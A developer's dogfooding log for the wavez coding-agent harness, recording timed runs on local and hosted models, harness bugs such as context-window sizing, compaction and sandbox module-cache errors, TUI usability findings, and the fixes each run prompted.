# Dogfooding wavez

Runs of `wavez -p` against real tasks in this repo, on qwen3:8b through
llama-server. Kept thin: what changed, and what the numbers argued for.

## 2026-08-16, first runs

| Task | Result | Wall |
|---|---|---|
| Read a file, summarize a type | correct | 32.5 s |
| Create a rule YAML | correct, 3 tool calls | 84 s |
| Insert 3 lines with `str_replace` | wrong, did not compile | 119 s |
| Same edit, thinking off | worse, replaced the anchor | 13.8 s |
| Same edit, thinking off + fixed schema | right placement, still did not compile | 14 s |

Three separable causes, not one.

**Thinking mode was on.** Replying "OK" cost 92 completion tokens, ~89 of them
reasoning. Decode is the bottleneck at ~21 tok/s, so every turn paid for a
reasoning trace nobody read. `--chat-template-kwargs '{"enable_thinking":false}'`
takes the same reply to 3 tokens and the edit task from 119 s to 14 s. The flag
now ships in `internal/runtime`.

**The `str_replace` schema was wrong about its own semantics.** It said
new_string was "text to put in place of old_string" without saying the
replacement is total, so the model deleted the anchor line when asked to insert
before it. Saying so plainly fixed the placement.

**What is left is not model work.** The residual failures were a missing
`path/filepath` import, a missing constant, and indentation. Imports and
formatting are what DESIGN.md assigns to deterministic resolution and to the
format pre-pass, not to the model.

Lesson: measure the harness before blaming the model. Two of the three causes
were ours, and they were worth 8.6x in wall time.

## Model A/B, same edit task

| Model | Decode | Native tool calls | Edit task |
|---|---|---|---|
| qwen3:8b, thinking on | 21.5 tok/s | yes | 119 s, did not compile |
| qwen3:8b, thinking off | 21.5 tok/s | yes | 14 s, right placement |
| qwen2.5-coder:7b | 30.9 tok/s | **no** | 10.5 s, no tool call at all |

qwen2.5-coder is faster and coder-tuned and still unusable here: its GGUF chat
template carries no tool support, so llama.cpp returns `tool_calls: null` and
the model invents `<function name=... />` XML in the content instead. Confirmed
against llama-server directly, so this is the template, not our client. It keeps
the role DESIGN.md already gives it, filling holes for intent edits, where no
tool call is needed.

qwen3:8b with thinking off stays the local default. Nothing in the 16 GB class
beats it for an agentic loop, and the tiers above it are ruled out by disk
before RAM: Devstral Small 2 wants 32 GB, Muse Glimmer is ~20 GB at 4-bit, and
the disk-streaming C engines (kimi-k3-in-c, colibri) need 167 GB to 1.7 TB and
run at 0.05 to 0.1 tok/s, roughly 500x slower than what an agent loop needs.

## ast-grep

A bare Go pattern silently matches nothing: `fmt.Println($$$ARGS)` parses as a
type conversion with an ERROR node, and the scan exits 0 having matched zero
times, which is indistinguishable from a clean pass. Call patterns need the
`context` plus `selector` form. The rule loader should reject the bare form.

## Harness fixes the runs paid for

Each of these was found by watching a real run fail, not by review.

- Thinking left on cost 30x the output tokens on short turns. 8.6x wall time
- `str_replace` never said its replacement was total, so "insert before" deleted
  the anchor line
- A failed anchor echoed a near match as long as `old_string`, so a bad anchor
  returned most of the file and paid for it twice
- `read` rejected `start_line` without `end_line`, which is what the model sends,
  wasting a turn every time
- There was no base system prompt at all. The model got tool schemas and the
  user's words, and nothing saying imports and formatting are automatic or that
  gates decide when it is done

## Where it stands

The model lands the edit when its anchor matches and cannot reliably produce a
verbatim anchor, which is DESIGN.md's measured 2/10 on this model. Every
harness-side cause found so far is fixed, so what is left is the model. The
design's own answers are the next things to test: escalate to hosted after one
failed edit, and move named changes to Modifiers and intents.

## The loop closing

A forced-broken edit now runs the whole path: the model edits, gates fail
verification, the trimmed build error comes back, the model reads it correctly
("declared but not used, and undefinedSymbol is not defined"), the thread ends
`verify_failed`, and the checkpoint operation id is on both the error event and
the abandoned-gate event. `jj op restore <id>` puts the file back and the repo
builds clean.

Three harness bugs stood between that and the earlier runs, all mine:

- `-max-turns` rebuilt the loop without the verifier, and every dogfood run
  passed that flag, so gates could never have fired
- The format pre-pass shelled out to `goimports`, which a released binary would
  never have on PATH. It runs in process now, and fails loudly when the go
  toolchain is missing rather than silently adding no imports
- A missing hosted key blocked a local-only run, because the hosted provider
  resolved its credential at construction

The model reached for `//nolint:varcheck` to silence a build error rather than
fix it. The guidance against that is in this repo's AGENTS.md, and wavez never
read it: not auto-loading agent files is a design decision, and the mechanism
that replaces it (`context` in `.wavez.pkl`, plus rules) was simply unused. Both
are wired now, and the rule catches a bare `//nolint` while allowing the house
style that carries a reason.

## 2026-08-18, diagnostics panel and model screen

One turn through the daemon (`Reply with the single word OK`, qwen3:8b,
thinking off, in a scratch jj repo since a git worktree of the main tree is not
one) and the panel filled in: 28.2 tok/s decode, 99% prefix hit on the run's
second request, 1.6k of an 8.0k window, model footprint 3.6 GB. Two probes of
the same server before that: the first request cached 1 of 18 prompt tokens at
108 tok/s prompt eval and 28.9 tok/s decode, the second cached 17 of 18 at
29.4 tok/s decode.

Two things the panel taught: RSS is the wrong number for a Metal-mapped GGUF
(16 MB against a 3.6 GB footprint), and `wavez -p` runs its own loop in
process, so nothing it does reaches the daemon's gauges.

The model screen listed both installed models with an update check against
the registry ("current" for each), previewed removing qwen2.5-coder:7b (4.4 GB
freed) and installing qwen3:4b (2.3 GB added) without acting on either, and
persisted a served-context edit and its restore. `ollama list` matched before
and after.

Three UX bugs found by driving it: `v` on Home opened an unvisited thread
onto nothing because peeking never subscribed, `Esc` inside the settings pane
left the whole screen because the global handler ran first, and a preview the
registry refused left its confirmation open. All three are fixed and tested.

## Open

- The model asserted success on code that does not compile, and nothing
  contradicted it. Gates exist but are not wired to change events
- Each `-p` run reuses one thread ID, so history accumulates across unrelated
  invocations
- One streamed token is one event, so a sentence is 30 rows in the log
- Tool inputs are not recorded in the event log, so a failed anchor cannot be
  read back after the fact. That made every str_replace failure harder to
  diagnose than it needed to be
- Hosted escalation is still unexercised, so the router's main claim is unproven

## 2026-08-18, the fix cycle on a planted bug

Setup: a scratch module in `/tmp/wz-cycle/dog` (a `lease` package copied in
shape from this repo, git plus colocated jj), with one planted boundary bug:
`Lease.Expired` returns true when `now` equals `Expires` while its doc comment
says a lease expiring exactly at now is still held. One test already existed
and passed. Command:

```
wavez -cycle fix -model local -allow-all -max-wall-clock 240s -p "Bug: in lease/lease.go, Lease.Expired reports a lease expiring exactly at now as expired, but the doc comment says ... Reproduce it with a test, then fix it."
```

Result, 2 min 22 s wall, 35 turns, 33 tool calls, $0 hosted:

```
reproduce    2 attempt(s)  artifact-fails  the change set declares no test on its changed lines, so it produced no artifact to fail
stop=condition_unmet phase=reproduce
```

Attempt 1: the model read `lease.go` once, then made 21 consecutive
`hypothesis` calls, every one marked `falsified`, none preceded by an
experiment, until the exact-repeat detector escalated and then stopped it
(`loop_detected`). It never wrote a test. Attempt 2 started from the standing
goal, the (empty) change set, and those 21 rows, called `context`, `read`,
`search` twice, `read` again, then emitted a `write` call whose input was not
valid JSON, which is `malformed_tool_call` and the end of the loop.

What the harness did right: the phase never advanced. Both verdicts are on
the cycle thread's log as `KindCycle` rows with the reason, the outcome is
`condition_unmet`, the exit status is 1, and `jj diff` shows no source change
outside `.wavez/`. A prompt describing the same three steps would have
reported the model's own account of itself as done.

What it exposed, fixed in the same change: the ledger accepted the same
(cause, verdict) row 21 times, so it now refuses a duplicate and the tool
result tells the model recording is not progress. Also worth knowing: the
hypothesis tool is a sink for qwen3:8b. Given a note-taking tool and a phase
whose exit it cannot satisfy in one edit, it takes notes. The narrowed tool
set for reproduce still includes `write` and `str_replace`, so the failure
was not the fence.

Not measured: whether the ledger-in-place-of-transcript handoff produces
work as good as a long conversation, since no run reached fix. On this model
the reproduce phase's binding constraint is the same one the M1 edit
measurements found (a valid tool call with a verbatim body), which is a
model problem the cycle correctly refused to paper over.

The TUI path was also driven under tmux: `n`, prompt, `tab`, `fix`, `enter`
creates a cycle thread; the transcript renders `▸ cycle` and `hypoth` rows.
Two findings. An unknown cycle name is refused by the daemon and the TUI
stores the error in `m.status`, which Home never renders, so it surfaces only
once a thread screen is open. And a cycle run needs a checkpoint, which needs
jj, so a git worktree that is not colocated fails the first phase at once
with `capturing checkpoint`.

## 2026-08-18, first runs on the merged M2 tree

Two threads at once from the TUI, qwen3:8b: a one-line README edit and a
question about the lease package. Both rendered as lanes in the schedule view
and finished within a minute; the question was answered correctly.

The README edit landed exactly (`Status: M1 in progress.` to `M2`), and the
verification round then failed it: `go-test failed: :`. The gate selected the
module root from the file's directory, `go test .` there fails with "no Go
files", and the trimmer dropped every output line because none named a
changed file, so the model was told a gate failed and nothing else. It asked
for details, the second round failed the same way, and the run ended
`verify_failed` on a correct change. Two harness fixes: the test gate abstains
when no Go file changed, and a failure whose frames were all trimmed still
names its package and says why it cannot say more (the change-triggered path
already did this, the verification path did not).

## 2026-08-18, driving the TUI

At 120x36 in tmux against the main-tree daemon, before the M2 lanes merged.

- Question-only thread ("which file defines the guard rules") answered correctly in ~40 s: two `search` calls, one answer, one verification round with nothing to gate. Answer text is truncated with `…` at the row width and there is no way to read it: the transcript has no row cursor, `j`/`k` show nothing, `Enter` expands nothing (DESIGN.md says rows are collapsible with Enter and permission rows take focus). Only the diff pane has a selected row. P0 for daily use: the one thing a user reads is the agent's reply
- `state` rows render as an empty label under a muted heading. Two of them per turn, pure noise; either render the state text or hide the row
- Empty `▸ agent` rows appear where a turn produced only tool calls
- Home frame is 4 rows tall in a 36 row terminal (content-height, not full-frame). Thread view fills the frame. Inconsistent, and Home wastes the screen
- Header of the thread view lacks the diagnostics strip (memory, needs-input badge) that DESIGN.md says is always in the header; Home has memory but not needs-input
- Tab from the transcript lands in the composer in insert mode, and Esc steps insert to normal to transcript, as designed. The "NOR press tab to compose" hint line reads as debug output rather than a status line
- Home column `step` for a finished thread says `done`, and `age` counts up since last event. Good
- Sending "jj" by accident re-ran the whole prompt and got the same answer again; the model does not react to a nonsense follow-up. Harness could refuse or confirm a sub-3-character prompt
- Diagnostics panel is six lines: tok/s and prefix hit are dashes (client does not parse `timings`), model resident is a dash. Honest, and thin
- Palette lacks `new`, `fork`, `kill`, `scope`, `pause` verbs that DESIGN.md lists; it has route and think verbs the design does not mention. Fuzzy filter typing works
- Home directory group header prints the full absolute path; the mock abbreviates to the repo name with a trailing slash. At 80 columns the header truncates the memory badge with `…`
- "1 threads" (no singular)

The first headless run after the merge could not edit at all: `str_replace`
answered `lease: no holding thread in context` on every call, because the
daemon attaches the holding thread to the context and `wavez -p` did not, and
the run still reported `complete` having changed nothing (verification had
no change set to fail). Both `-p` and a cycle's phase threads now attach the
holder.

## 2026-08-18, timing harness, first rows

`_ai_/bench/timing/` holds the harness. Only the local tier ran before the
session ended, and the machine was not quiet for all of it, so these are
first rows and not the comparison the audit still owes (hosted and
`claude -p` rows next, on a quiet machine, three samples each).

| Task | qwen3:8b via `wavez -p` | Outcome |
|---|---|---|
| q1 question about the guard rules | 7.3 s | correct |
| e1 one-line README edit | 15 s then 374 s | first run refused every write (lease holder missing on the headless path, fixed), second run landed the edit exactly in 12 s of model time and then took six more minutes to exit, which did not reproduce (a repeat exited in 9 s) |
| e2 add a method and a table test | 28 s, then 423 s | no change the first time (`stagnant`), code that does not build the second |
| e3 rename across a package | 203 s | no change |

Two harness findings from the rows: a run that ends having changed nothing on
a task that asked for a change still reports `complete` when its last turn is
"let me try again" (the announcement detector did not fire on that phrasing),
and the coverage-map build that every `-p` process starts competes with the
model for the machine and never finishes inside one run, so it restarts on the
next. The daemon is where the build belongs; a `-p` run should not start one.

## 2026-08-18, the transcript becomes readable

Drove the TUI under `tmux new -d -x 120 -y 40` against the real daemon and the
running `qwen3:8b`, asking one question about `internal/tui/transcript.go`, to
measure the P0 from the session above rather than restate it.

Before: the reply was 1,614 characters, 15 lines wrapped at that width, and the
thread view rendered 100 of them on one truncated row. About 94% of the answer
was unreachable, `j` and `k` moved nothing, and `Enter` expanded nothing. Two
`state` rows rendered as bare labels with no text beside them.

After: the answer renders in full over 13 wrapped lines, unfolded on arrival
because the harness typed the turn `answer`. `k` walks a cursor up the rows and
marks the current one, `Enter` folds it back to one line with an ellipsis, and
the empty `state` rows are gone. The fold state survives leaving the thread and
coming back.

Three findings the run produced that the code review had not:

- Once a role marker types an agent row, a later `KindAgent` text event must not
  coalesce into it, because a new turn has started
- `renderRow`'s width budget used `len(label)`, a byte count, against a label
  holding `▸`, which is three bytes and one cell. Harmless while every label was
  ASCII and wrong as soon as the glyph entered the budget
- The footer promised `[enter]send` while the diff pane held focus, where Enter
  binds to nothing. The hint now names Enter only on the two panels where it
  does something

The role only arrives when the turn ends, so a final answer streams as one
folded line and unfolds when the turn completes. That reads correctly in the
PTY: the row is legible while it grows and opens once there is something worth
opening.

Two failures found while verifying, neither caused by this work and both under
investigation. `TestSend_RunErrorReachesTheThreadLog` fails on CI and passes
20/20 here: a `list` answered right after the stream delivered `StateFailed`
reports `idle`, which is the two surfaces disagreeing rather than a flaky
assertion. `internal/hook`'s tests fail under a parallel `go test ./...` on this
laptop and pass under `-p 1`, and the cause turned out to be Gatekeeper rather
than the bound.

Measuring `Start` and `Wait` separately on a trivial `/bin/sh` script showed
`Start` steady at 1-5 ms throughout, with every stall inside `Wait`. A freshly
written executable's first exec costs 200-245 ms on an idle machine and 4-6 ms
on the second exec of the same file, a 50x first-exec tax; `XprotectService`
and `syspolicyd` held most of a core for the whole run. Under `go test ./...`
that tax climbs into seconds, because the suite is itself linking about thirty
fresh unsigned binaries that queue for the same scan. Two of sixty sample execs
hit the 5s wall.

So the 5s bound is right for a hook (roughly 20x headroom at steady state) and
the failing subtests were never testing the timeout: they assert exit-code to
verdict mapping and had merely inherited `DefaultTimeout`. They now pass an
explicit test bound, the two subtests that do exercise the timeout keep their
20 ms one, and `DefaultTimeout` is unchanged. Whether a real hook can lose this
race against a concurrent gate build is untested and plausible, since
`internal/gate` shells out to `go build` and `go test`.

## 2026-08-18, snippets and the fleet Home in a PTY

Two runs against a real `wavezd` on a temporary socket, no model needed for
either.

Snippets: a project `snippets.json` holding `qt`, the TUI under
`tmux new -d -x 100 -y 30`, a thread opened, the composer taken fullscreen
(`[tab]snippet` in the footer), `please q` typed, `Tab`. The line read
`please use the question tool liberally` with the cursor at column 39. Not
proven: the inline composer, where `Tab` still cycles panels, so completion
is fullscreen-only until the open question in DESIGN.md is settled.

Fleet Home: one thread in each of two `git init` repos, `wavez` launched
from the first. Home listed that repo's thread alone. `w` re-listed every
root and grouped rows under `repo-a/` and `repo-b/`, `/repo-b` filtered to
the second group, `Enter` on its row opened a thread from the other root,
and `n` showed `in repo-a`, the launch root. One finding the run produced:
the fleet title printed the raw launch path, so it now prints the common
parent of the listed roots with `~` for home, which is right for a `~/dev`
layout and degrades to `/` for roots spread across the disk.

## 2026-08-18, toast and links in a PTY

Toast: a `wavezd` with no model configured, a thread created from a
throwaway client, the TUI on Home under tmux. The thread went `working`,
`responding`, `failed`, and the footer rule read `✖ say-hi failed` for four
seconds before the hints came back. The first capture read
`toast-repo/say-hi`, root-qualified outside fleet scope where Home shows the
bare name, and that is fixed. Not driven: a real `needs_input` transition,
which needs a model. The unit tests cover it.

Links: a temp repo whose `.wavez.pkl` maps `#(\d+)` to a pull URL, a prompt
`discuss #123 and ENG-456 please`. `tmux capture-pane -p -e` through `cat -v`
showed `^[]8;;https://github.com/kyleking/wavez/pull/123^[\#123^[]8;;^[\` on
the user row and again on the agent row that echoed it, `ENG-456` unlinked
because no pattern named it, and the wrap width unchanged.

Parking has no PTY run: reaching a Broker prompt needs a model turn. The
fake-loop harness case (`TestSchedule_ParkedThreadFreesAdmissionAndReadmitsOnAnswer`)
is the proof so far. Building it surfaced a real defect: `PermissionGate.Ask`
read `req.ThreadID`, which nothing sets, so every permission wait was keyed
to an empty thread id and only worked because the lookup was cosmetic. It
reads the thread from the context now, the way `QuestionAsker` already did.

## 2026-08-18, VHS tour of the TUI

`docs/demo.tape` drives Home, a thread, schedule, diagnostics, and help against
a scratch `wavezd -socket /tmp/wz-demo/d.sock -dir .` with no model. One
finding: the daemon listed only threads it created in this process, so
`.wavez/threads/` with fifty-eight logs from earlier runs rendered as
`0 threads`. `manager.reopen` fixes that by opening every log at project load,
and the tape's Home frame shows those threads.

++ b/_ai_/bench/dogfood.md

## 2026-08-18, first session on the M4 Pro

A fresh checkout on the 24 GB M4 Pro. Ollama, ast-grep, and llama-server
installed from brew; qwen3:8b pulled; the larger models (`qwen3.8:27b`,
`devstral-small-2`, `qwen3-coder:30b`) queued behind a link that fell to
250 KB/s mid-session, so the item 1 probe against them is still owed. Every
run below shared the machine with those pulls, which cost bandwidth and not
CPU, so the wall numbers are usable and not clean.

The timing harness on `qwen3:8b`, `wavez -p -model local`, before this
session's fixes:

| Task | M4 Pro | M2 Pro (earlier rows) | Outcome |
|---|---|---|---|
| q1 question | 15.4 s | 7.3 s | wrong file named both times here (`.github/workflows/ci.yml`), no tool call on the fast run |
| e1 one-line README edit | 12.9 s | 374 s | the edit landed exactly in 12 s of model time; the run then stopped `verify_failed` because `ast-grep` was not installed on this laptop and the convention gate reported that as a failure the model was told to fix |
| e2 method plus table test | 55.7 s | 423 s | `provider_failed`: llama-server refused a request at 8,222 tokens against its 8,192 window, so the router's estimate ran under the served window by 30 tokens |
| e3 rename across a package | 41.9 s | 203 s | `stagnant` after 11 tool calls, no change |

Three findings from the rows, beside the two defects the session opened with:

- `contextWindow` in `.wavez.pkl` never reached `llama-server`: `app.ensureLocalServer` built `runtime.Config{Port: cfg.LocalPort}` and nothing else, so the server started at `DefaultContextSize` (8192) whatever the config said, and `router.LocalContextBudget` was a constant beside it. Fixed in this session: the config's window and any size saved on the models screen reach the supervisor, the router escalates when the request plus `ReplyReserve` would not fit that window, and the estimate counts the tool specs it was omitting
- A gate whose tool is missing read as a failing gate. `astgrep: ast-grep binary not found on PATH` reached the model as verification feedback, and the model spent its next turn trying to install it. Fixed in this session: the convention gate abstains with the install hint as its reason, which the gate log records and the model never sees
- The 8,222 against 8,192 miss was the estimate, not the model: `estimateRequestTokens` omitted the tool schemas, and the budget left no room under the served window for the reply

After this session's fixes: e1 rerun with `ast-grep` installed and
`contextWindow = 32768` in the bench copy's `.wavez.pkl` landed the edit and
completed in 17.1 s wall (14.6 s model), with `llama-server` started at
`-c 32768` for the first time (the flag now follows the config, and a size
saved on the models screen overrides it). e2 rerun no longer hit the window
and ran 23 turns to `loop_detected` in 110 s, code that does not vet, which
is the model rather than the harness. The wider detector (a task worded as
an edit that ends with no change) is pinned on the fake-loop harness only;
no real-model run of e3's shape has been watched since.

The larger models for the item 1 probe (`qwen3.8:27b` first, per
`_ai_/research/2026-08-local-model-landscape.md`, then `devstral-small-2`
and `qwen3-coder:30b`) were still pulling at 0.25-0.7 MB/s when the session
ended, so the probe and the timed comparison stay open. Both `wavez -p` rows
above and the pulls shared the machine, and neither the CPU nor the model
was the contended resource.

Meanwhile the other laptop's session landed the same three defects and the
fleet lane on `main` (v0.13.0). This session's versions of the sync fix and
the per-laptop daemon were dropped in favour of those, and its detector
work was re-applied as a delta: the task's wording now counts as the
edit-shaped signal beside an attempted edit tool, and a retry promised
after an apology on the same line ("Apologies, let me try again.") counts
as an announcement.

## 2026-08-19, the M4 Pro probe on qwen3.8:27b

Next item 1, first pass. `qwen3.8:27b` (Q4_K_M, 15.65 GiB, the model the
landscape research named) pulled through ollama, served by `llama-server`
build 10470 on wavez's port with `-np 1 -c 12288 --spec-type ngram-simple`
and thinking off, and the four timing-harness tasks run through
`wavez -p -model local` with `contextWindow = 12288` in the bench copy's
`.wavez.pkl`. One full sample plus a second e1 before the run was stopped to
give the memory back; the rows are in `timing/results-2026-08-18.jsonl`.

| Task | qwen3.8:27b | qwen3:8b, same machine | Outcome |
|---|---|---|---|
| e1 one-line README edit | 51.5 s, 58.5 s | 13-19 s | landed and `complete` both times, the first with a native `str_replace` call on the first turn |
| e2 method plus table test | 214 s | never landed in 7 runs | landed, builds, tests pass, `complete` after 7 turns and 8 tool calls. The first local model to finish e2 here |
| e3 rename across a package | 300 s | `stagnant` or `loop_detected` | `deadline` at 9 turns and 13 tool calls with no file changed |
| q1 question | 67 s | 15-27 s, wrong file | `complete`; answer not checked by hand |

What the serving side says, from the raw probe before the harness:

- It fits only barely without `sudo sysctl iogpu.wired_limit_mb`: Metal
  reports 18,186 MiB usable, the weights take 15.65 GiB, and `-c 12288`
  serves while `-c 16384` and every larger window fail with
  `kIOGPUCommandBufferCallbackErrorOutOfMemory` on the first request.
  llama-server's default of four slots fails at 8k too; `-np 1` is required
- Prefill is the cost: 90 tokens/s on the 2.6k-token wavez prefix (29 s
  cold), against 340 tokens/s for qwen3:8b. The research pass predicted this
  for the hybrid Gated DeltaNet models on Metal, which lacks the GLA kernels
  (llama.cpp [#21452](https://github.com/ggml-org/llama.cpp/pull/21452)).
  Decode is 11-12 tokens/s against 40. A cached second turn costs 31 prompt
  tokens and under a second
- The ollama modelfile carries two `FROM` lines (the weights first, then a
  931 MB projector for the image side). `runtime.ParseModelfileGGUF` takes
  the first, which is the weights, so wavez can start this model itself;
  the probe started the server by hand only to pin `-np 1 -c 12288`, which
  the config cannot yet express (`-np` is fixed at 1 and the window comes
  from `contextWindow`, so it could)
- While it runs the laptop sits at about 10% free with ~19.6 GB wired and
  2 GB in the compressor, and a harness run's `go build` and `go test`
  land on top of that. This is the memory the admission headroom exists to
  arbitrate, and 0.25 free fraction is not reachable with this model loaded

Still owed: the other two samples, `devstral-small-2` (pulling at the end
of the session) and `qwen3-coder:30b`, and a run with the wired limit
raised so the served window can reach 32k.

## 2026-08-20, the three-tier router, and what stopped a run from editing

The tier rename (`local`/`hosted` to `fast`/`balanced`/`deep`) landed by
hand. The interface half was handed to `wavez -p` on `stealth/ox-alpha`,
OpenRouter's free alpha, as a bounded task naming its five target files:
put the balanced tier back into `routeCycle`, the palette, `routeLabel`,
and the tui tests.

The first run stopped at `max_turns` after 60 turns, 68 tool calls, 7m8s,
and $0.0000. It made no edit call at all. Of the 68 calls, 28 were `grep`,
26 were reads, and around 20 shell calls went to a toolchain problem that
had nothing to do with the task:

```
go: downloading charm.land/bubbletea/v2 v2.0.8
internal/gate/format.go:13:2: golang.org/x/tools@v0.49.0: Get
  "https://proxy.golang.org/golang.org/x/tools/@v/v0.49.0.zip":
  dial tcp: lookup proxy.golang.org: no such host
```

`sandbox.Exec` redirected `GOMODCACHE` into the session tmp directory,
which starts empty, while the Seatbelt profile denies network. Every
`go build` or `go test` on a package with an external dependency therefore
failed, and the model spent a third of its budget rediscovering
`GOMODCACHE=$HOME/go/pkg/mod` and a writable `TMPDIR` by trial and error
before it ever saw a real compile error. Reproduced outside wavez, holding
everything else fixed and varying only the module cache: the session cache
exits 1 on DNS, the machine's cache exits 0, cgo packages included.

The fix stops redirecting the module cache. The profile already allows
reading it and denies writing it, so a sandboxed build reads what is on the
machine and cannot poison it. `TMPDIR` joins `GOTMPDIR` in the session
directory, which is what cgo's compiler driver actually uses, and
`GOPROXY=off` turns a genuinely missing module into
`module lookup disabled by GOPROXY=off` rather than a DNS error.
`TestExec_GoBuildResolvesDependenciesWithoutNetwork` fails on the old
environment and passes on the new one.

One caveat on the first run: this session was editing `internal/tui` test
files at the same time, so some of what it read went stale underneath it.
The toolchain finding does not depend on that, since it reproduces standalone.

## 2026-08-21, what the second run's 71 tool calls were actually spent on

Counted from `.wavez/threads/p-dkubt3z97r3s.jsonl`, the run that completed:
32 read, 19 shell, 11 `str_replace`, 8 search, 1 context. Two of those
numbers are the whole finding.

**Search was abandoned after its first query.** The model asked fuzzy for
`ChoiceFast ChoiceBalanced ChoiceDeep ChoiceLocal ChoiceHosted` and got
`no matches for … across 473 indexed files`. `ftsQuery` quoted each term and
joined them with a space, which is FTS5's implicit AND, so the query asked
for one document holding all five names and no such document exists. The
message reads as an answer about the code rather than about the query, and
13 of the run's 19 shell calls after it were `grep` and `sed`. Terms are
joined with OR now, and `TestSearch_FuzzyMatchesAnyTermNotEveryTerm` fails
on the old join.

**Half the reads returned lines already in the window.** 28 of the 32 reads
named a line range, and the read cache deliberately skipped ranges, so only
4 reads could ever be deduplicated. 16 of the 32 read a file that had not
been edited since the previous read of it: roughly 29k characters, about 7k
tokens, re-fed. The cache now keys on the content hash plus the spans
already delivered, so a range inside one the model already holds comes back
as a reference.

Nothing here is about the model. Both are the harness charging a run for
work it already did.

## 2026-08-21, the numbers a run leaves behind

Both findings above came out of a Python script over one transcript, which is
not a thing a future session will repeat. `wavez -stats <thread>` reads the
thread log and reports them. On the same run:

```
thread p-dkubt3z97r3s
turns 60, tool calls 71, elapsed 11m12s
tokens in 861699, out 26644, cache read 778304 (90% of input)

tool calls by name
  read            32 calls    58911 result bytes
  shell           19 calls    12926 result bytes
  str_replace     11 calls      644 result bytes
  search           8 calls     4881 result bytes
  context          1 calls     3235 result bytes

repeat reads 16 of 32 (26581 bytes), empty searches 3
gate rounds 2, failed 0, review objections 2, compaction saved ~7168 tokens
```

Three of those lines were not visible before. 861k input tokens went into one
scoped TUI change, 90% of it served from the provider's prefix cache, which is
what kept the run free rather than the run being small. Three of the eight
searches matched nothing. Eleven `str_replace` calls returned 644 bytes
between them, so the edit tool is already close to free and the reading around
it is not.

The turn marker now records which tier served it, so the next run can say
where its tokens went rather than only how many there were.

## 2026-08-21, the read cache moved a cost instead of removing it

Run 3 gave wavez a scoped task (`-stats` gains a JSON mode, `internal/bench`
and `cmd/wavez` only) on the balanced tier. It stopped on `max_turns` at 60
with the work finished and verified: `go build ./...`, `go test`, and `gofmt`
all clean on its diff, one new method, one flag pass-through, and one test
that unmarshals into a map so a wrong json tag cannot pass.

```
turns 60, tool calls 63, elapsed 15m6s
tokens in 549165, out 20926, cache read 461056 (83% of input)
tiers balanced 60
  shell           40 calls    27279 result bytes
  read            12 calls    29587 result bytes
  str_replace      7 calls      382 result bytes
  search           4 calls     1065 result bytes
repeat reads 6 of 12 (2895 bytes), empty searches 0
```

Against run 2 the search fix holds: zero empty searches where there were
three. The read cache does not. Repeat-read output fell from 26,581 bytes to
2,895, and shell calls went from 19 to 40. Four reads returned "unchanged
since you read lines N-M", and all four were followed immediately by a shell
command reading the same file:

| reference | next tool call |
|---|---|
| `cmd/wavez/main.go` | `sed -n '200,260p' cmd/wavez/main.go` |
| `internal/bench/stats.go` | `cat -n internal/bench/stats.go` |
| `internal/bench/stats.go` | `awk 'NR>=17 && NR<=60 {printf "%d\t%s\n", NR, $0}' …` |
| `internal/bench/render.go` | `awk '{printf "%d\t%s\n", NR, $0}' …` |

`sed`, `cat`, and `awk` returned 21,166 bytes between them, so the cache
withheld about 24 KB of read output and 21 KB of it came back through a
slower door, costing 19 extra tool calls on the way. The read tool now always
returns what it was asked for, and `DedupeToolReads` collapses the repeat in
history where the model never sees the refusal.

Two of those four recoveries printed line numbers with `NR`, which is the
open question the reversal leaves behind.

## 2026-08-21, compaction was sized from the wrong window

Runs 4, 5, and 6 all took the same task (`-stats` gains a comparison mode,
`internal/bench` and `cmd/wavez` only) on the balanced tier, so what changed
between them is the harness rather than the work.

Run 4 stopped on its deadline at 3m0s having made no edit at all: 24 turns,
27 tool calls, 910 output tokens, 14 of 19 reads repeats, and 15 compactions.
Its transcript reads as a search for something it already had, in shrinking
windows over the same four files:

```
read internal/bench/stats_test.go        (whole file)
read internal/bench/stats_test.go 19-148
read internal/bench/stats_test.go 37-128
read internal/bench/stats_test.go 55-108
```

The cause is one line. `maybeCompact` measured the trigger against
`Loop.ContextWindow()`, which is the local runtime's served window, whatever
tier the turn actually routed to. A hosted turn with a window in the hundreds
of thousands was therefore compacted at 0.75 of 8,192, and `DropOldToolResults`
replaced every tool result older than four turns with a one-line reference.
The model was reading its way back to what compaction had taken, forever. The
budget now follows the routed tier (`router.ContextBudget`).

Run 5 died on the way to measuring it: OpenRouter sent `"code": 429` in a
mid-stream error payload where the OpenAI spec types a string, the decode
failed, and the run reported the decoder rather than the rate limit. Both
tiers hit it, since escalation retried the same decoder. `flexString` now
takes either shape.

Run 6 finished the task and hit `max_turns` at 60, against run 3's 60:

| | run 3 | run 6 |
|---|---|---|
| shell calls | 40 | 29 |
| shell result bytes | 27,279 | 12,870 |
| repeat reads | 6 of 12 | 0 of 12 |
| edits (`str_replace` + `write`) | 7 | 15 |
| input tokens | 549,165 | 1,533,732 |
| compaction saved | ~8,170 | 0 |

Shell fell by a quarter and its output by half, repeat reads went to zero, and
the run made twice the edits in the same 63 calls. Input tokens tripled,
which is the honest cost of the fix: a 60-turn run now carries its whole
history because 0.75 of 128k is never reached. 81% of it was cached. Trading
1M cached tokens for 11 shell calls and a run that edits is the right side of
that trade today, and it puts a bound on how long a run can stay useful
before compaction has to earn its place back at a budget that fits the tier.

Two findings this session has not acted on yet:

- The model batches by repeating a JSON key: `{"path":"a","path":"b"}` and
  `{"dir":".","dir":"internal/bench"}`, three times across two runs. Go keeps
  the last one, so it silently gets half of what it asked for
- `list` with no pattern printed 200 alphabetically-first paths, which on this
  repo is dot-directories, and the model still could not see the layout
- Run 6 left a `git worktree add .tmp-clean HEAD` behind in the project root,
  6.6 MB that broke `ls-lint` until it was removed. A run that adds a worktree
  inside the project it is working in has no way to clean it up after

## 2026-08-21, telling a run what the gates already checked

Run 7 took a task of the same shape as runs 4-6 (`-stats` gains a shell
command inventory, `internal/bench` only) with three changes in the harness
since run 6: a pass from the change gates now reaches the model as one line,
`read` and `list` take several targets in one call, and the guard holds the
git subcommands that move the working copy.

It is the first dogfood run to finish rather than stop on a bound:

| | run 6 | run 7 |
|---|---|---|
| stop | max_turns | complete |
| turns | 60 | 30 |
| tool calls | 63 | 36 |
| shell calls | 29 | 3 |
| shell result bytes | 12,870 | 537 |
| input tokens | 1,533,732 | 576,136 |
| elapsed | 17m1s | 15m33s |

The three shell calls left are the task's own verify line, twice, and one
`git status`. Everything else the run needed to know about its edits arrived
without being asked for:

```
Gates ran on your changes and passed: format, convention, lsp, go-test. Do not re-run these yourself.
Gates ran on your changes and found this:
go-test build github.com/kyleking/wavez/internal/bench
  internal/bench/render.go:35:11: undefined: slices
```

